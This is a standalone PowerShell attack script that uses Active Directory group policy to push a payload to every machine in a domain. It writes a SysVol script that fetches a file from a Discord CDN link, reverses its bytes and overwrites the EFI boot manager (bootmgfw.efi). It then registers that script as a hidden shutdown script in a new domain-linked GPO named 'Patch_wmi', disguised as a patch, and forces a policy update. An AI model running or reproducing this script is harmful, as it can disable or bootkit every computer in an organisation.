$DOMAIN = (Get-ADDomain).Forest
$DN = (Get-ADDomain).DistinguishedName
$DC = (Get-ADDomain).RIDMaster
'Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/674573769422929920/981664019926646834/file.png" -OutFile "C:\Windows\Temp\file.png";mountvol Y: /s;Copy-Item -Path Y:\EFI\Microsoft\Boot\bootmgfw.efi -Destination Y:\EFI\Microsoft\Boot\bootmgfw.efi.old;$file = [io.file]::ReadAllBytes("C:\Windows\Temp\file.png");[array]::Reverse($file);[io.file]::WriteAllBytes("Y:\EFI\Microsoft\Boot\bootmgfw.efi",$file);mountvol Y: /d;' | Out-File \\$DOMAIN\SysVol\$DOMAIN\scripts\script.ps1 
$GUID = (New-GPO -Name "Patch_wmi").id
New-GPLink -Name "Patch_wmi" -Target "$DN"  
md "\\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\Machine\Scripts\Shutdown"
md "\\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\Machine\Scripts\Startup"
"`n[ScriptsConfig]`nEndExecutePSFirst=true`n[Shutdown]`n0CmdLine=\\$DOMAIN\SysVol\$DOMAIN\scripts\script.ps1`n0Parameters=`n" | Out-File "\\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\Machine\Scripts\psscripts.ini"
New-Item "\\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\Machine\Scripts\scripts.ini"
$file = Get-Item "\\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\Machine\Scripts\scripts.ini"
$file.Attributes = "hidden"
$file = Get-Item "\\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\Machine\Scripts\psscripts.ini"
$file.Attributes = "hidden"
"[General]`nVersion=2`n" | Out-File "\\$DOMAIN\SysVol\$DOMAIN\Policies\{$GUID}\GPT.ini" -Encoding utf8
Get-ADObject -Filter "objectCategory -eq 'groupPolicyContainer' -and DisplayName -eq 'Patch_wmi'" | Set-ADObject -Replace @{versionNumber = "2"; gPCMachineExtensionNames="[{42B5FAAE-6536-11D2-AE5A-0000F87571E3}{40B6664F-4972-11D1-A7CA-0000F87571E3}]"}
Invoke-Command -ComputerName $DC -ScriptBlock { gpupdate /force }
gpupdate /force
